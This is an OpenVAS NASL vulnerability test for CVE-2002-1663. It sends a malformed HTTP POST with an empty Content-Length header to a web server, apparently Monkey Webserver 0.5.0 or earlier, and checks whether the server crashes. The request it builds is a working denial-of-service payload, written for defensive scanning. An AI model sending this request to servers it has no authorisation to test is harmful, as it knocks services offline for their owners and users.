# OpenVAS Vulnerability Test
# Description: POST with empty Content-Length
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11924");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-1663");
  script_bugtraq_id(6096);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("POST with empty Content-Length");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  # The listening port in the example configuration file is 2001
  # I suspect that some people might leave it unchanged.
  script_require_ports("Services/www", 80, 2001);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your web server.");

  script_tag(name:"summary", value:"Your web server crashes when it receives an incorrect POST
  command with an empty 'Content-Length:' field.");

  script_tag(name:"impact", value:"An attacker may use this bug to disable your server, preventing
  it from publishing your information.");

  script_tag(name:"affected", value:"Monkey Webserver 0.5.0 or minors versions.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80); # 2001 ?
if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

r = http_post(item:"/", port:port, data:"");
r2 = ereg_replace(string:r, pattern:'Content-Length:([ 0-9]+)', replace:'Content-Length:');
if(r2 == r) { # Did not match?
  r2 = string('POST / HTTP/1.0\r\n',
              'Host: ', get_host_ip(), '\r\n',
              'Content-Length:\r\n\r\n');
}

send(socket:soc, data:r2);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  set_kb_item(name:"www/buggy_post_crash", value:TRUE);
  exit(0);
}

exit(99);